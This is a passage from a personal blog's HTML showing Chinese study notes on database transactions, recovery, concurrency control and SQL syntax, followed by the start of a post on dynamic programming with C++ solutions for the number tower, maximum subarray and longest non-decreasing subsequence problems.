+<p>ROLLBACK;//事务异常终止，撤销更新操作，回滚到事务开始时状态</p>
+<p><strong>ACID</strong></p>
+<ul>
+<li><p>原子性——数据库的逻辑工作单位，事务中操作要么都做要么都不做</p>
+</li>
+<li><p>一致性——事务的执行从一个一致性状态转移到另一个一致性状态（只包含事务提交的结果）</p>
+</li>
+<li><p>隔离性——一个事务的执行不能被其他事务干扰</p>
+</li>
+<li><p>持续性——一个事务一旦提交，他对数据的改变就是永久的。</p>
+</li>
+</ul>
+<p><strong>故障的种类：</strong></p>
+<ol>
+<li><p>事务内部的故障</p>
+<p>恢复：事务撤销（UNDO），强行回滚该事务</p>
+</li>
+<li><p>系统故障（软故障）</p>
+<p>后果：正在运行的事务非正常终止，不破坏数据库、内存中缓冲区信息丢失</p>
+<p>恢复：UNDO所有未完成的事物，REDO所有已提交的事务</p>
+</li>
+<li><p>介质故障（硬故障）</p>
+<p>后果：破坏部分数据库，影响正在存取这部分数据的所有事务</p>
+<p>恢复：装入数据副本，REDO成功事务</p>
+</li>
+<li><p>计算机病毒</p>
+</li>
+</ol>
+<p><strong>恢复的实现技术：</strong></p>
+<ol>
+<li><p>数据转储</p>
+<p>数据库管理员定期将整个数据库复制到磁带、磁盘或其他存储介质上保存起来的过程。备用的数据文本称为后备副本。</p>
+<ul>
+<li><p>静态转储</p>
+<p>在系统中无运行事务时转储。转出开始时数据库处于一致性装填，转储期间不允许对数据库存取修改。得到的一定是数据一致性的副本。</p>
+<p>优点：实现简单</p>
+<p>缺点：降低数据库可用性</p>
+</li>
+<li><p>动态转储</p>
+<p>转储和事务并发进行</p>
+<p>优点：不用等待</p>
+<p>缺点：不能保证副本数据正确有效</p>
+<p>需要用日志文件记录转储操作期间对数据库的修改操作。副本+日志文件。</p>
+</li>
+<li><p>海量转储：转储全部数据库</p>
+</li>
+<li><p>增量转储：只转储上次转储后更新过的数据</p>
+</li>
+<li><p>对比：海量恢复起来更方便，数据库很大事务处理频繁则增量有效。</p>
+</li>
+</ul>
+</li>
+<li><p>登记日志文件</p>
+<p>记录事务对数据库更新操作的文件</p>
+<p>登记的顺序必须严格按并发事务执行时间次序；必须先写日志文件，后写数据库。</p>
+<p>用缓冲区临时保存日志，根据需要一次写入多个缓冲块到磁盘。</p>
+<ul>
+<li><p>以记录为单位——记录事务的开始（begin）结束（commit；rollback）以及所有更新操作。</p>
+<p>事务标识、操作类型、操作对象、更新前数据旧值、更新后数据新值。</p>
+</li>
+<li><p>以数据块为单位</p>
+<p>事务标识、被更新的数据块。</p>
+</li>
+</ul>
+<p>作用：</p>
+<ul>
+<li>事务故障恢复、系统故障恢复、介质故障恢复</li>
+<li>动态转储必须建立日志文件，静态转储也可以建立日志文件</li>
+</ul>
+</li>
+</ol>
+<h3 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h3><p><strong>并发操作带来的不一致性：</strong></p>
+<p>并发操作破坏了数据的隔离性</p>
+<ul>
+<li><p>丢失修改</p>
+<p>后来的写入覆盖了之前的修改</p>
+</li>
+<li><p>不可重复读</p>
+<p>T1读取数据后T2对数据进行了更新（修改、删除、插入），T1没法再次读到原来数据</p>
+</li>
+<li><p>读“脏”数据</p>
+<p>T1修改数据写入磁盘，T2读取，T1撤销修改将数据恢复原值，此时T2的数据就是“脏”数据</p>
+</li>
+</ul>
+<p><strong>并发控制主要技术：</strong></p>
+<p>封锁、时间戳、乐观控制法、多版本并发控制</p>
+<p><strong>封锁：</strong></p>
+<p>操作前先加锁</p>
+<ol>
+<li><p>排他锁（X/写锁）</p>
+<p>只允许加锁者读取和修改，其他事务不能再加锁，也不能读和修改。</p>
+</li>
+<li><p>共享锁（S/读锁)</p>
+<p>加锁者可以读不能修改，其他事务只能加S锁不能加X锁，都只能读。</p>
+</li>
+</ol>
+<p><strong>封锁协议：</strong></p>
+<ol>
+<li><p>一级封锁协议</p>
+<p>事务在修改数据前必须加X锁，结束才能释放。</p>
+<p>防止丢失修改，不保证可重复读和不读脏数据</p>
+</li>
+<li><p>二级封锁协议</p>
+<p>一级+事务在读之前必须加S锁，读完释放。</p>
+<p>防止丢失修改、读脏数据，不保证可重复读</p>
+</li>
+<li><p>三级封锁协议</p>
+<p>一级+事务在读之前必须加S锁，事务结束才释放。</p>
+</li>
+</ol>
+<p><strong>活锁：</strong></p>
+<p>T1封锁了R，T2请求封锁R等待，T3请求封锁R，首先批准T3，则T2一直被插队。</p>
+<p><strong>死锁：</strong></p>
+<p>T1封锁R1，T2封锁R2，他们相互请求封锁对方的数据。</p>
+<ul>
+<li>预防死锁：一次封锁全部数据，按照数据对象给定的顺序封锁</li>
+<li>诊断解除死锁：超时则判定死锁，（周期性生成）事务等待图（有回路则死锁）。选择处理代价最小的事务撤销，释放其所有的锁。</li>
+</ul>
+<h3 id="数据库编程"><a href="#数据库编程" class="headerlink" title="数据库编程"></a>数据库编程</h3><p><strong>SQLCA：</strong>（数据结构）</p>
+<p>sql语句执行后系统反馈给程序当前的工作状态、运行环境</p>
+<p><strong>主变量：</strong></p>
+<p>sql语句中使用的主语言的程序变量</p>
+<p><strong>游标：</strong></p>
+<p>数据缓冲区，存放SQL语句执行结果</p>
+<p><strong>建立和关闭数据库连接</strong></p>
+<p><strong>存储过程：</strong></p>
+<p>经编译后存储在数据库服务器中，使用只需要调用。持久性存储模块。</p>
+<ul>
+<li><p>CREATE PROCEDURE P1(a int, b float) </p>
+<p>AS DECLARE c int;</p>
+<p>BEGIN </p>
+<p>select grade into a from sc;</p>
+<p>IF THEN ENDIF; </p>
+<p>END;</p>
+</li>
+<li><p>CALL PROCEDURE P1(a,b);</p>
+</li>
+<li><p>ALTER PROCEDURE P1 RENAME TO P2;</p>
+</li>
+<li><p>DROP PROCEDURE P1;</p>
+</li>
+</ul>
+<p><strong>函数：</strong></p>
+<p>函数必须指定返回的类型</p>
+<ul>
+<li>CREATE FUNCTION F1(a INT) RETURN char(9) AS…;</li>
+<li>SELECT F1(a);</li>
+</ul>
+<h3 id="SQL特点"><a href="#SQL特点" class="headerlink" title="SQL特点"></a>SQL特点</h3><ul>
+<li>综合统一——集DDL,DML,DCL功能于一体，可以独立完成数据库生命周期中的全部活动，可随时修改模式，数据操作符统一</li>
+<li>高度非过程化——无需了解存储路径</li>
+<li>面向集合的操作方式</li>
+<li>以同一种语法结构提供多种使用方式——独立语言，也可以嵌入式</li>
+<li>语言简洁、易学易用</li>
+</ul>
+<p><strong>数据定义：</strong></p>
+<ul>
+<li>CREATE SCHEMA S1 AUTHORIZATION zhang;</li>
+<li>DROP SCHEMA S1 CASCADE/RESTRICT;</li>
+<li>CREATE TABLE T1(Sno char(9) PRIMARY KEY, Sname char(20) UNIQUE);//UNIQUE不能取空</li>
+<li>ALTER TABLE T1 [ADD COLUMN Snoo char(9) NOT NULL] [ADD CONSTRAINT XXX] [DROP COLUMN/CONSTRAINT XXX [CASCADE|RESTRICT] ] [ALTER COLUMN Sno char(10)];</li>
+<li>DROP TABLE T1 [CASCADE| RESTRICT];//cascade会删除视图、触发器、索引等</li>
+<li>CREATE [UNIQUE] [CLUSTER] INDEX I1 ON SC(Sno DESC);//默认ASC</li>
+<li>ALTER INDEX I1 RENAME TO I2;</li>
+<li>DROP INDEX I1;</li>
+</ul>
+<p><strong>数据查询：</strong></p>
+<p>SELECT [ALL|DISTINCT] Sno FROM SC [AS XX] [WHERE xxx] [GROUP BY xxx HAVING XXX] [ORDER BY Sno [ASC|DESC] ];</p>
+<p>GROUP BY:如果没有对查询结果分组，聚集函数将作用于整个查询结果，分组后聚集函数作用于每个组。</p>
+<p>WHERE中不能有聚集函数，用HAVING替代，HAVING作用于组。</p>
+<p>外连接：SELECT XX FROM Student LEFT OUT JOIN sc ON (Studnt.Sno = sc.Sno);</p>
+<p>嵌套查询：子查询不能order by</p>
+<p>集合查询：UNION（自动去掉重复元组，加ALL保留） INTERSECT EXCEPT，两个结果必须相容</p>
+<p>基于派生表的查询：</p>
+<p>SELECT Sno,Cno FROM SC,(SELECT Sno,avg(grade) FROM sc GROUP BY Sno) as avg_sc(avg_Sno,avg_grade) WHERE xxx;</p>
+<p><strong>数据插入：</strong></p>
+<ul>
+<li>INSERT INTO sc [(Sno,cno)] VALUES (‘XXX’,’XX’);</li>
+<li>INSERT INTO sc [(xx)] (SELECT XXX);//必须与INTO匹配</li>
+</ul>
+<p><strong>数据修改删除：</strong></p>
+<ul>
+<li>UPDATE SC SET sno=’1’, cno = ‘2’ [WHERE XXX];</li>
+<li>DELETE FROM SC [WHERE XXX];</li>
+</ul>
+<p><strong>视图：</strong></p>
+<ul>
+<li>CREATE VIEW V1 [(Sno, Cno)] AS (SELECT XXX) [WITH CHECK OPTION];//对视图更新操作满足视图定义的条件</li>
+<li>DROP VIEW V1[CASCADE];</li>
+<li>查询视图：视图消解法</li>
+<li>更新视图：回更新基本表，但有些视图是不能更新的，因为不能唯一有意义的转换为对基本表的更新。不允许更新的视图定义上的视图也不允许更新。</li>
+<li>作用：简化用户操作，使用户以多种角度看待同一数据，提供逻辑独立性，安全保护，更清晰表达查询。</li>
+</ul>
+<p>L14p79检查点</p>
+<p>L15p69可串行性</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2020/11/28/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/" data-id="ckr5o9zzp003cxkur8iwi7aua" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/db/" rel="tag">db</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-动态规划" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" class="article-date">
+  <time datetime="2020-10-27T15:58:00.000Z" itemprop="datePublished">2020-10-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%AE%97%E6%B3%95/">算法</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2020/10/27/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">动态规划</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="一维动态规划"><a href="#一维动态规划" class="headerlink" title="一维动态规划"></a>一维动态规划</h3><hr>
+<p><strong>重叠子问题（Overlapping Subproblems）：</strong>一个问题可以被分解为若干个子问题，且这些子问题会重复出现。</p>
+<p><strong>最优子结构（Optimal Substructure）：</strong>一个问题的最优解可以由其子问题有效的构造出来。</p>
+<blockquote>
+<p>一个问题必须有这两个特点，才能用动态规划去解决。动态规划通过记录重叠子问题的解（递推或者记忆化搜索）来解决问题。</p>
+</blockquote>
+<h4 id="1-数塔问题（二维）"><a href="#1-数塔问题（二维）" class="headerlink" title="1.数塔问题（二维）"></a>1.数塔问题（二维）</h4><p><img src="number_tower.png" alt="number_tower"></p>
+<p><strong>解法：</strong>用 $f[i][j]$ 存数塔中的数，$dp[i][j]$表示数塔（i，j）处数之前可取的最大路径值，可写出状态转移方程：$dp[i][j] = max(dp[i+1][j], dp[i+1][j+1]) + f[i][j]$</p>
+<p><strong>代码：</strong></p>
+<p>递归写法（含有许多重复计算）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in">max_path</span>(<span class="number">1</span>, <span class="number">1</span>, n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i == n)</span><br><span class="line">		<span class="keyword">return</span> f[i][j];</span><br><span class="line">	<span class="keyword">int</span> left, right;</span><br><span class="line">	left = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j, n);</span><br><span class="line">	right = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j + <span class="number">1</span>, n);</span><br><span class="line">	<span class="keyword">return</span> (left &gt; right) ? (left + f[i][j]) : (right + f[i][j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>递归写法（记忆化搜索）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn], dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,<span class="built_in">max_path</span>(<span class="number">1</span>, <span class="number">1</span>, n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i == n)<span class="comment">//边界条件</span></span><br><span class="line">		dp[i][j] = f[i][j];</span><br><span class="line">	<span class="keyword">if</span> (dp[i][j] != <span class="number">0</span>)<span class="comment">//数塔从1开始 &amp;&amp; (i,j)之前的最长路径已经被记录</span></span><br><span class="line">		<span class="keyword">return</span> dp[i][j];</span><br><span class="line">	<span class="comment">//(i,j)之前的最长路径未被记录</span></span><br><span class="line">	dp[i+<span class="number">1</span>][j] = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j, n);</span><br><span class="line">	dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = <span class="built_in">max_path</span>(i + <span class="number">1</span>, j + <span class="number">1</span>, n);</span><br><span class="line">	<span class="keyword">return</span> (dp[i + <span class="number">1</span>][j] &gt; dp[i + <span class="number">1</span>][j + <span class="number">1</span>]) ? (dp[i + <span class="number">1</span>][j] + f[i][j]) : (dp[i + <span class="number">1</span>][j + <span class="number">1</span>] + f[i][j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>递推写法</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1001</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn][maxn], dp[maxn][maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_path</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//输入</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;f[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)<span class="comment">//边界</span></span><br><span class="line">		dp[n][i] = f[n][i];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--)<span class="comment">//求出每个dp[i][j]</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j] = <span class="built_in">max</span>(dp[i + <span class="number">1</span>][j], dp[i + <span class="number">1</span>][j + <span class="number">1</span>]) + f[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, dp[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-最大连续子序列和"><a href="#2-最大连续子序列和" class="headerlink" title="2. 最大连续子序列和"></a>2. 最大连续子序列和</h4><p><img src="%E6%9C%80%E5%A4%A7%E8%BF%9E%E7%BB%AD%E5%AD%90%E5%BA%8F%E5%88%97.png" alt="最大连续子序列"></p>
+<p><strong>解法：</strong>令dp[i]表示以A[i]结尾的最大连续序列和，那么整个序列的最大和即为dp[1]—dp[n]中最大值.接下来可以求得dp[i]状态转移方程$dp[i] = max(A[i],A[i]+dp[i-1] )$。边界条件即dp[0] = A[0].</p>
+<p>对于上例13来说，以它为结尾的最大序列和要么是13+以-4结尾的最大序列和，要么是13本身（加上-4部分反而会更小）。</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	dp[<span class="number">1</span>] = A[<span class="number">1</span>];<span class="comment">//边界</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">		dp[i] = <span class="built_in">max</span>(A[i], A[i] + dp[i - <span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="keyword">if</span> (dp[i] &gt; max)</span><br><span class="line">			max = dp[i];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, max);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-最长不降子序列-LIS"><a href="#3-最长不降子序列-LIS" class="headerlink" title="3. 最长不降子序列(LIS)"></a>3. 最长不降子序列(LIS)</h4><p><img src="LIS.jpg" alt="LIS"></p>
+<p><strong>解法一:</strong></p>
+<p>dp[i]记录以A[i]结尾的LIS长度，则整个序列的LIS长度为dp[1]—dp[n]中最大值。其中dp[i]的取值要么为dp[j]+1(此时A[i]可以接在以A[j]结尾的LIS之后)，要么为1（此时A[i]值非常小，没有办法接在任何子链后面）。由此可写出状态转移方程：$dp[i] = max(1,dp[j]+1) (j = 1,2,…,i-1 且 A[j] &lt;= A[i])$.其中dp[j]+1中的j表示满足A[j] &lt;= A[i]的j.当A[i]是当前最小值时，dp[j]+1并不存在，此时dp[i]为1.此解法复杂度为$O(n^2)$.</p>
+<p><strong>代码：</strong></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">int</span> A[maxn], dp[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;A[i]);</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		dp[i] = <span class="number">1</span>;<span class="comment">//先假定每个元素自成一个子序列</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (A[j] &lt;= A[i] &amp;&amp; dp[j] + <span class="number">1</span> &gt; dp[i])</span><br><span class="line">			&#123;</span><br><span class="line">				dp[i] = dp[j] + <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		ans = <span class="built_in">max</span>(dp[i], ans);<span class="comment">//在生成过程中记录最大dp[i]</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解法二:</strong> </p>
+<p>在解法一中，每次计算dp[i]都要将所有A[i]前面的A[j]同A[i]比较一遍，也因此占用了n的复杂度，解法二是对比较过程的优化。</p>
+<p>设置一个数组d，其中d[i]表示长度为i的LIS最小尾元素的值，len表示d数组中元素个数。如下图所示，len的长度就是我们需要的最终结果（即6），在维护d[len]的过程中，首先遍历序列，若遇到比当前len所存的d[len]值更大的数，则放在d[++len]处（如9后面的16）；若遇到比当前len所存的d[len]小的数，则去替换前面第一个比自己大的数（如18原来在37的后面，在d数组中替换了前面的24）。</p>
